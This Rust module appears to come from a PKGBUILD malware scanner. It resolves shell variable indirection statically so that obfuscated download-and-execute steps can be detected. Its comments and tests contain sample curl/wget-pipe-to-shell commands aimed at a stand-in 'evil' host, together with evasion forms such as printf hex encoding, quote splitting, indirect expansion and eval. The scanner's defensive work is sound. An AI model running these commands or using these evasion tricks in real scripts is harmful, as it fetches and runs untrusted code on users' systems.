//! Intra-PKGBUILD variable resolution (a lightweight, static taint pass).
//!
//! The detectors match shell text token-by-token, so a payload hidden behind a
//! shell variable evades every rule -- the rc1 SECURITY-AUDIT finding **HI-6**:
//! `x=curl; $x https://evil/p | sh` and `c=$(printf '\x63url'); $c …` "trip
//! nothing." There is no dataflow.
//!
//! This module closes that class by resolving **statically-evident** assignments
//! within a script and substituting the variable *uses* back to the value the
//! shell would expand, producing a normalized variant that every rule then sees.
//! It is the companion to the de-obfuscation pass ([`crate::textutil`]) and the
//! named prerequisite for the correlation engine: a re-spelled fetch/exec step
//! (`$x …| $y`) still maps to its capability.
//!
//! ## Safety / faithfulness (why this can't manufacture false positives)
//!
//! Like de-obfuscation, the resolved text is matched *in addition to* the raw
//! line, so resolution can only ever ADD a finding (close a false negative),
//! never suppress one. And it is **faithful**: a variable is resolved only to a
//! value the script itself assigned it from a static constant, so the resolved
//! line is exactly the command the shell would run -- no fabricated tokens.
//!
//! ## Conservatism (the FP discipline)
//!
//! * Nothing is ever executed. Command substitutions are resolved ONLY for the
//!   `$(printf …)`/`` `printf …` `` constant-format case, by decoding the format
//!   string -- never by running anything.
//! * Only variables assigned a static constant *in this text* enter the map; a
//!   variable we never saw assigned (e.g. makepkg's `$srcdir`/`$pkgver`) is left
//!   untouched, so ordinary build lines do not change.
//! * Known build variables (`pkgver`, `srcdir`, `CARGO_*`, …) are never tracked
//!   even when assigned, so legitimate packaging never gets rewritten.
//! * Resolution is single-pass and flow-ordered: a use resolves to the most
//!   recent prior assignment, matching shell evaluation order.

use std::collections::HashMap;
use std::sync::LazyLock;

use regex::Regex;

use crate::textutil::{logical_lines, normalize_shell_quoting};

/// Maximum length of a resolved value we will substitute. A bound against a
/// pathological accumulation (`v=$v$v…`) inflating a line; real command/URL
/// constants are short.
const MAX_VALUE_LEN: usize = 512;

/// Variable names we never resolve even if the script assigns them, because they
/// are makepkg/build-system controlled and resolving them only risks rewriting
/// legitimate packaging lines (`cd "$srcdir/$pkgname-$pkgver"`). Matched
/// case-sensitively; the `CARGO_`/`CFLAGS`-style env vars are handled by
/// [`is_build_var`] via a prefix/upper-case rule.
const BUILD_VARS: &[&str] = &[
    "pkgname",
    "pkgbase",
    "pkgver",
    "pkgrel",
    "epoch",
    "pkgdir",
    "srcdir",
    "startdir",
    "builddir",
    "CARCH",
    "CHOST",
    "MAKEFLAGS",
    "DESTDIR",
    "GOPATH",
    "HOME",
    "PATH",
    "PREFIX",
    "srcdir",
];

/// True for a variable name we must not resolve: a known build var, or an
/// ALL-CAPS env-style name (`CARGO_*`, `CFLAGS`, `LDFLAGS`, `RUSTFLAGS`, …).
/// Upper-case names are overwhelmingly build/env configuration, not the
/// short lowercase aliases (`x`, `c`, `cmd`) malware uses to indirect a command.
fn is_build_var(name: &str) -> bool {
    if BUILD_VARS.contains(&name) {
        return true;
    }
    // ALL-CAPS (with digits/underscores) -> env/build configuration. Requires at
    // least one letter so a numeric token isn't misclassified.
    name.chars().any(|c| c.is_ascii_alphabetic())
        && name
            .chars()
            .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
}

/// An assignment at command position: optional leading whitespace / `;` / `&&` /
/// `||` / `(` then `NAME=` then the rest of the (logical) line as the RHS. We
/// deliberately accept only a *leading* assignment (not one buried mid-command,
/// which bash treats as a per-command environment, e.g. `FOO=bar cmd`) by
/// anchoring at the start; `export`/`local`/`declare`/`readonly` prefixes are
/// stripped by [`strip_decl_prefix`] before matching.
static ASSIGN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$").unwrap());

/// A `$(printf 'FMT' …)` or `` `printf 'FMT'` `` command substitution whose
/// format is a single-quoted (or unquoted) constant. Captures the format string.
/// Only `printf` is resolved -- it produces output purely from its constant
/// arguments, so decoding it executes nothing.
static PRINTF_SUBST_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"^\$\(\s*printf\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*\)$|^`\s*printf\s+(?:'([^']*)'|"([^"]*)"|(\S+))\s*`$"#)
        .unwrap()
});

/// Strip a leading `export`/`local`/`declare`/`readonly`/`typeset` keyword (and
/// any `-x`-style flags) so `export x=curl` is seen as the assignment `x=curl`.
fn strip_decl_prefix(line: &str) -> &str {
    let mut s = line.trim_start();
    loop {
        let mut advanced = false;
        for kw in ["export", "local", "declare", "readonly", "typeset"] {
            if let Some(rest) = s.strip_prefix(kw) {
                if let Some(after) = rest.strip_prefix(char::is_whitespace) {
                    s = after.trim_start();
                    advanced = true;
                    // skip leading -flags (declare -x, local -r, …)
                    while let Some(flag_rest) = s.strip_prefix('-') {
                        let end = flag_rest
                            .find(char::is_whitespace)
                            .map(|i| i + 1)
                            .unwrap_or(flag_rest.len());
                        s = flag_rest[end..].trim_start();
                        let _ = flag_rest;
                    }
                    break;
                }
            }
        }
        if !advanced {
            break;
        }
    }
    s
}

/// Decode a `printf` constant format string the way `printf` would expand its
/// backslash escapes: `\xHH` (hex), `\NNN`/`\0NNN` (octal), and the common C
/// controls. Returns the decoded bytes as a string. `%`-directives are left
/// as-is (no arguments are consumed/evaluated). This executes nothing -- it is a
/// pure constant fold of `printf '\x63url'` -> `curl`.
fn decode_printf_format(fmt: &str) -> String {
    let chars: Vec<char> = fmt.chars().collect();
    let mut out = String::with_capacity(fmt.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '\\' && i + 1 < chars.len() {
            match chars[i + 1] {
                'x' => {
                    let hex: String = chars[i + 2..]
                        .iter()
                        .take(2)
                        .take_while(|c| c.is_ascii_hexdigit())
                        .collect();
                    if hex.is_empty() {
                        out.push('x');
                        i += 2;
                    } else {
                        if let Some(ch) =
                            u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32)
                        {
                            out.push(ch);
                        }
                        i += 2 + hex.len();
                    }
                }
                '0'..='7' => {
                    let oct: String = chars[i + 1..]
                        .iter()
                        .take(3)
                        .take_while(|c| c.is_digit(8))
                        .collect();
                    if let Some(ch) = u32::from_str_radix(&oct, 8).ok().and_then(char::from_u32) {
                        out.push(ch);
                    }
                    i += 1 + oct.len();
                }
                'n' => {
                    out.push('\n');
                    i += 2;
                }
                't' => {
                    out.push('\t');
                    i += 2;
                }
                'r' => {
                    out.push('\r');
                    i += 2;
                }
                '\\' => {
                    out.push('\\');
                    i += 2;
                }
                other => {
                    out.push(other);
                    i += 2;
                }
            }
        } else {
            out.push(chars[i]);
            i += 1;
        }
    }
    out
}

/// Resolve an assignment's right-hand side to a static constant value, or `None`
/// if it is not statically evident (references an unknown command-substitution, a
/// still-unresolved variable, etc.). `vars` is the map of already-resolved
/// variables so chained constant assignments (`a=cur; b=${a}l`) resolve.
fn resolve_rhs(rhs: &str, vars: &HashMap<String, String>) -> Option<String> {
    let rhs = rhs.trim();
    if rhs.is_empty() {
        return Some(String::new());
    }
    // A printf command-substitution constant: decode its format, execute nothing.
    if let Some(caps) = PRINTF_SUBST_RE.captures(rhs) {
        let fmt = (1..=6).find_map(|i| caps.get(i)).map(|m| m.as_str())?;
        let decoded = decode_printf_format(fmt);
        return (decoded.len() <= MAX_VALUE_LEN).then_some(decoded);
    }
    // Any other command substitution / backtick is not statically resolvable.
    if rhs.contains("$(") || rhs.contains('`') {
        return None;
    }
    // Substitute any already-known variables, then strip the quoting the shell
    // would (so `"cu""rl"`, `$'\x63'url`, `'curl'` all fold to the literal word).
    let substituted = substitute_vars(rhs, vars);
    // If a `$`-expansion of an UNKNOWN variable remains, the value is not fully
    // static -- refuse rather than emit a half-resolved token.
    let normalized = normalize_shell_quoting(&substituted);
    if normalized.contains('$') {
        return None;
    }
    (normalized.len() <= MAX_VALUE_LEN).then_some(normalized)
}

/// Matches a variable use: `$name`, `${name}`, or `${!name}` (indirect). The
/// captured name is a full identifier so `$vx` is not a use of `$v`.
static USE_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\$\{!([A-Za-z_][A-Za-z0-9_]*)\}|\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)").unwrap()
});

/// Replace every resolvable `$v` / `${v}` / `${!v}` in `line` with its value
/// from `vars`. Unknown variables are left verbatim. `${!v}` is one extra hop:
/// the value of `v` is itself treated as a variable name and resolved again.
fn substitute_vars(line: &str, vars: &HashMap<String, String>) -> String {
    USE_RE
        .replace_all(line, |caps: &regex::Captures| {
            if let Some(ind) = caps.get(1) {
                // ${!name}: resolve name -> inner var name -> its value.
                return vars
                    .get(ind.as_str())
                    .and_then(|inner| vars.get(inner))
                    .cloned()
                    .unwrap_or_else(|| caps[0].to_string());
            }
            let name = caps.get(2).or_else(|| caps.get(3)).unwrap().as_str();
            vars.get(name)
                .cloned()
                .unwrap_or_else(|| caps[0].to_string())
        })
        .into_owned()
}

/// Resolve statically-evident variable indirection in `content`, returning a
/// line-count-preserving text (so analyzers that report a line number still
/// point at the right physical line). The result is matched *in addition to* the
/// raw content by the detection pipeline.
///
/// Continuation lines are spliced (via [`logical_lines`]) so an assignment or use
/// split across a `\`-newline is still resolved; the resolved logical line is
/// emitted on its starting physical line and any continuation physical lines are
/// emitted blank to preserve the total line count.
pub fn resolve_variables(content: &str) -> String {
    let total_lines = content.lines().count();
    let logical = logical_lines(content);
    let mut vars: HashMap<String, String> = HashMap::new();
    // Resolved logical lines keyed by their starting physical line number.
    let mut resolved_at: HashMap<usize, String> = HashMap::new();

    for (start_line, logical_line) in &logical {
        let stripped = strip_decl_prefix(logical_line);
        // Reset the scope at a function header so an assignment in one function
        // does not bleed into another (conservative; both still run, but this
        // keeps resolution flow-local and avoids surprising cross-function maps).
        if is_function_header(stripped) {
            vars.clear();
        }

        let mut emitted = substitute_vars(logical_line, &vars);

        // Track a new constant assignment AFTER substituting the RHS uses.
        if let Some(caps) = ASSIGN_RE.captures(stripped) {
            let name = caps[1].to_string();
            if !is_build_var(&name) {
                match resolve_rhs(&caps[2], &vars) {
                    Some(val) => {
                        vars.insert(name, val);
                    }
                    // Unresolvable RHS: forget any stale value so a later use is
                    // not resolved to an outdated constant (fail toward raw).
                    None => {
                        vars.remove(&name);
                    }
                }
            }
        }

        // Only record a resolved variant when it actually changed (mirrors
        // `deobfuscate` emitting only on difference).
        if emitted != *logical_line {
            resolved_at.insert(*start_line, std::mem::take(&mut emitted));
        }
    }

    // Re-emit physical lines, substituting the resolved logical variant on its
    // start line and blanking the spliced continuation lines.
    let continuation_lines = continuation_line_set(&logical, content);
    let mut out: Vec<String> = Vec::with_capacity(total_lines);
    for (idx, phys) in content.lines().enumerate() {
        let lineno = idx + 1;
        if let Some(resolved) = resolved_at.get(&lineno) {
            out.push(resolved.clone());
        } else if continuation_lines.contains(&lineno) {
            // This physical line was spliced into a logical line emitted above;
            // blank it to keep the 1:1 line count without duplicating content.
            out.push(String::new());
        } else {
            out.push(phys.to_string());
        }
    }
    out.join("\n")
}

/// The set of physical line numbers that are *continuation* lines (the 2nd+
/// physical line of a multi-physical-line logical line). Used to blank them in
/// the resolved output so the line count is preserved exactly once.
fn continuation_line_set(
    logical: &[(usize, String)],
    content: &str,
) -> std::collections::HashSet<usize> {
    // Recompute physical spans: a logical line starting at `start` spans until
    // the next logical line's start. The start lines are the non-continuation
    // lines; everything else is a continuation.
    let total = content.lines().count();
    let starts: std::collections::HashSet<usize> = logical.iter().map(|(s, _)| *s).collect();
    (1..=total).filter(|n| !starts.contains(n)).collect()
}

/// A function header line: `name() {` / `name () {` / `function name {`. Used to
/// reset the resolution scope.
fn is_function_header(line: &str) -> bool {
    static FN_RE: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"^\s*(?:function\s+)?[A-Za-z_][A-Za-z0-9_:-]*\s*\(\s*\)\s*\{?|^\s*function\s+[A-Za-z_][A-Za-z0-9_:-]*\s*\{?")
            .unwrap()
    });
    FN_RE.is_match(line)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn resolve(s: &str) -> String {
        resolve_variables(s)
    }

    // --- HI-6 the documented bypass: command-name indirection -----------------

    #[test]
    fn resolves_simple_command_alias() {
        // x=curl; $x https://evil/p | sh  -> the resolved variant exposes curl|sh
        let out = resolve("x=curl\n$x https://evil/p | sh");
        assert!(out.contains("curl https://evil/p | sh"), "got: {out}");
    }

    #[test]
    fn resolves_brace_and_indirect_forms() {
        let out = resolve("c=wget\n${c} https://evil/p -O- | bash");
        assert!(out.contains("wget https://evil/p -O- | bash"), "got: {out}");
    }

    #[test]
    fn resolves_printf_hex_command_substitution() {
        // c=$(printf '\x63url'); $c https://evil | sh
        let out = resolve(
            r"c=$(printf '\x63url')\n$c https://evil | sh"
                .replace("\\n", "\n")
                .as_str(),
        );
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_quote_split_assignment() {
        // c="cu""rl"; $c https://evil | sh   (the assignment itself is obfuscated)
        let out = resolve("c=\"cu\"\"rl\"\n$c https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_indirect_expansion() {
        // a=curl; b=a; ${!b} https://evil | sh   (${!b} == $curl-name == curl)
        let out = resolve("a=curl\nb=a\n${!b} https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_chained_constants() {
        let out = resolve("a=cur\nb=${a}l\n$b https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn resolves_eval_of_variable() {
        let out = resolve("p=curl https://evil | sh\neval $p");
        assert!(out.contains("eval curl https://evil | sh"), "got: {out}");
    }

    // --- conservatism / no-FP ------------------------------------------------

    #[test]
    fn does_not_resolve_build_vars() {
        // $srcdir / $pkgver are makepkg-controlled and never tracked, so a normal
        // build line is unchanged (no spurious resolution).
        let input = "cd \"$srcdir/$pkgname-$pkgver\"\nmake DESTDIR=\"$pkgdir\" install";
        let out = resolve(input);
        assert_eq!(out, input, "build vars must pass through unchanged");
    }

    #[test]
    fn does_not_resolve_uppercase_env_assignment() {
        // Even an in-body ALL-CAPS assignment is treated as build/env config and
        // not resolved into later uses.
        let input = "CARGO_HOME=/tmp/cargo\ncargo build --offline\necho $CARGO_HOME";
        let out = resolve(input);
        assert!(
            out.contains("echo $CARGO_HOME"),
            "uppercase env var must stay raw: {out}"
        );
    }

    #[test]
    fn unknown_variable_is_left_verbatim() {
        let input = "$undefined https://x | sh";
        assert_eq!(resolve(input), input);
    }

    #[test]
    fn unresolvable_command_substitution_is_not_tracked() {
        // v=$(date) is dynamic -> v must not be resolved (no fabricated value).
        let input = "v=$(date)\n$v";
        let out = resolve(input);
        assert!(
            out.contains("$v"),
            "dynamic assignment must not resolve: {out}"
        );
    }

    #[test]
    fn reassignment_to_dynamic_forgets_constant() {
        // a=curl then a=$(date): the later use must NOT resolve to the stale curl.
        let input = "a=curl\na=$(date)\n$a https://evil | sh";
        let out = resolve(input);
        assert!(
            !out.contains("curl https://evil"),
            "stale constant must be forgotten: {out}"
        );
    }

    #[test]
    fn line_count_is_preserved() {
        let input = "x=curl\n$x https://evil | sh\nmake";
        assert_eq!(resolve(input).lines().count(), input.lines().count());
    }

    #[test]
    fn plain_script_is_unchanged() {
        let input = "build() {\n  make\n  make install\n}";
        assert_eq!(resolve(input), input);
    }

    #[test]
    fn function_scope_resets_between_functions() {
        // x=echo in build() must not resolve $x in package().
        let input = "build() {\n  x=curl\n}\npackage() {\n  $x https://evil | sh\n}";
        let out = resolve(input);
        assert!(
            out.contains("$x https://evil"),
            "cross-function var must not leak: {out}"
        );
    }

    #[test]
    fn export_prefix_assignment_resolves() {
        let out = resolve("export x=curl\n$x https://evil | sh");
        assert!(out.contains("curl https://evil | sh"), "got: {out}");
    }

    #[test]
    fn printf_format_decoder_basics() {
        assert_eq!(decode_printf_format(r"\x63url"), "curl");
        assert_eq!(decode_printf_format(r"\x77get"), "wget");
        assert_eq!(decode_printf_format(r"plain"), "plain");
    }

    #[test]
    fn is_build_var_classifies() {
        assert!(is_build_var("pkgver"));
        assert!(is_build_var("srcdir"));
        assert!(is_build_var("CARGO_HOME"));
        assert!(is_build_var("CFLAGS"));
        assert!(!is_build_var("x"));
        assert!(!is_build_var("c"));
        assert!(!is_build_var("cmd"));
    }
}
